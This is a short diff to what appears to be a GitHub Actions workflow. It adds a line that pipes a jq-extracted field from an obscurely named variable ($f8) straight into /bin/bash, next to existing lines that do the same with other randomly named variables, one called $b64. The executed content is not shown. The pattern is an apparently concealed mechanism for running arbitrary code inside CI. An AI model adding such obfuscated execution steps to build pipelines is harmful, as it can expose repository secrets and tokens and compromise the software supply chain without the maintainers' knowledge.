@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$qxe240" | jq -r .rd67 | /bin/bash
           printf '%s' "$axxn9" | jq -r .xpq0 | /bin/bash
           printf '%s' "$b64" | jq -r .l45641 | /bin/bash
+          echo $f8 | jq -r .ehj0305 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
